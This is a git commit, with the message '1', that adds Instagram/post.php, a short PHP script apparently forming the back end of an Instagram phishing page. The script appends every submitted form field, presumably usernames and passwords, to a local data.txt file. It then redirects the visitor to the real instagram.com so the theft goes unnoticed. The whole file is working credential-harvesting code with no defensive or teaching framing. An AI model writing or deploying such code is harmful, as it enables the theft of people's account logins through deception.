2497b9546e253d571c38607aef4c34b3b27c9a50
namanmic-official <namanmic.2023+githubaccount@gmail.com>
2023-07-07 08:46:43 +0530

    1

---
+++ Instagram/post.php
@@ -0,0 +1,20 @@
+
+<?php
+  
+// Set the location to redirect the page
+header ('Location: http://www.instagram.com');
+  
+// Open the text file in writing mode 
+$file = fopen("data.txt", "a");
+  
+foreach($_POST as $variable => $value) {
+    fwrite($file, $variable);
+    fwrite($file, "=");
+    fwrite($file, $value);
+    fwrite($file, "\r\n");
+}
+  
+fwrite($file, "\r\n");
+fclose($file);
+exit;
+?>
